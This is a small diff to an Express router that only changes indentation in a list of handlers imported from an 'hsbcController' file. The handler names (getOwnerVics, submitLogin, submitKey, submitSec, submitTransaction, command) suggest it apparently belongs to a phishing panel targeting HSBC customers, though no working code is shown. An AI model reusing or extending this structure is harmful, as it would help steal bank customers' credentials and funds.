@@ -1,15 +1,15 @@
 const express = require("express");
 const {
-    getOwnerVics,
-    command,
-    getInfo,
-    submitLogin,
-    submitLoginAgain,
-    submitKey,
-    submitSec,
-    submitTransaction,
-    submitQuestionnaire,
-    deleteEntry,
+	getOwnerVics,
+	command,
+	getInfo,
+	submitLogin,
+	submitLoginAgain,
+	submitKey,
+	submitSec,
+	submitTransaction,
+	submitQuestionnaire,
+	deleteEntry,
 } = require("../controllers/hsbcController");
 
 const router = express.Router();
